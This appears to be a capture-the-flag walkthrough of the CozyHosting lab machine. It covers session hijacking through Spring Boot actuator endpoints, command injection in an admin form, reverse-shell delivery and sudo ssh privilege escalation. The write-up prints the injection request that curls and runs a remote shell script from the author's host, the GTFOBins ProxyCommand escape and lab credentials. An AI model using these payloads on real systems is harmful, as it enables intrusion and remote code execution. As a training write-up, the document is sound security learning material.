# IP

10.10.11.230

# Steps

## Enumeration

Rustscan

```bash
rustscan -a 10.10.11.230

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

```

Nmap

```bash
nmap -sCV -p10.10.11.230 --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap.out

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Open SSH, and HTTP ports. Since we don't have any creds, we can look at the web app on HTTP.

There's nothing on the actual site, and forced browsing for files and directories doesn't give us anything either. 

Moving on to scanning any default endpoints, we get an `/error` page that gives us a 500 server error.

Googling this error page shows us that its a spring boot error page. Seclists has a wordlist for this, so we can try to directory bust it to find any spring boot links.

![](Assets/Pasted%20image%2020250915153201.png)

There are links that have `actuator/` in them. This is something worth checking out. 

Going to `/actuator/mappings` gives us all the links and what they do in the context of this spring boot application.

There's a link called `actuator/sessions/` that gives us the currently logged in sessions. There's a user called `kanderson` logged in, there's also a session token there.

## Exploit

We can try to do some session hijacking with this.

![](Assets/Pasted%20image%2020250915151954.png)

We can paste the session token from the `sessions/` url, into the session cookie area on our browser, and try to hit the `/admin/` endpoint with it.

![](Assets/Pasted%20image%2020250915153550.png)

We're now in the user `K Anderson`'s admin panel

![](Assets/Pasted%20image%2020250915153910.png)

There's a part of this site that is a form, allowing the inclusion of hosts for automatic patching.

### Command Injection

### Exploit

Bash shell

Fetched it from my python server using curl

```bash
POST /executessh HTTP/1.1
Host: cozyhosting.htb
Content-Length: 108
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Origin: http://cozyhosting.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://cozyhosting.htb/admin
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=ED8D51C8FC80CCF6AB95DA14C574DC0E
Connection: keep-alive

host=localhost&username=2>/dev/null%0a$(curl${IFS}http://10.10.14.14:8000/rev.sh${IFS}-o${IFS}/tmp/rev.sh);#
```

![](Assets/Pasted%20image%2020250915225042.png)

![](Assets/Pasted%20image%2020250915225022.png)

Next we execute it using the following injection

```bash
host=localhost&username=2>/dev/null%0a$(bash${IFS}/tmp/rev.sh);#
```

Here, the request on Burp hangs, but my penelope has caught a reverse shell

![](Assets/Pasted%20image%2020250915225354.png)

There's only one file here

![](Assets/Pasted%20image%2020250915225513.png)

## PrivEsc

### John

Doing internal enumeration on the shell we got isn't going anywhere because its too low level. There's a user called `john` but we can't access his account. However, there's an interesting file left behind in the `/app` directory called `cloudhosting-0.0.1.jar`

We grab this jar file, and use an online viewer to take a look at what's inside (https://jar.tools/jar-viewer)

We got the manifest, so we can get version info about the build and backend of this webapp

![](Assets/Pasted%20image%2020250916000029.png)

We end up finding some database creds here

![](Assets/Pasted%20image%2020250916000425.png)

Its safe to assume there's a postgres instance running on the server, but to be sure we can run `netstat -autnp` to check what's using the port `5432`.

We can then connect to the postgres instance on the machine using the creds we harvested earlier.

![](Assets/Pasted%20image%2020250916001206.png)

![](Assets/Pasted%20image%2020250916001446.png)

![](Assets/Pasted%20image%2020250916001457.png)

![](Assets/Pasted%20image%2020250916001836.png)

I can try to crack these hashes to see what's in them using Hashcat.

There's only one account on the shell other than `app`. Its `josh`. I can try to login over ssh as josh.

![](Assets/Pasted%20image%2020250916215409.png)

### Local Enumeration

I start with running `sudo -l` to see what the user john can run as sudo. Turns out he can run ssh as sudo.

![](Assets/Pasted%20image%2020250916215351.png)

The first thing to do is check GTFO Bins for a privesc.

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

![](Assets/Pasted%20image%2020250916220623.png)

# Findings

# Creds

```plaintext
# web admin account
kanderson

# postgres login
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR

# creds from users table
kanderson : $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
admin : $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm : manchesterunited
```

# Proof

# References

https://0xdf.gitlab.io/cheatsheets/404#spring-boot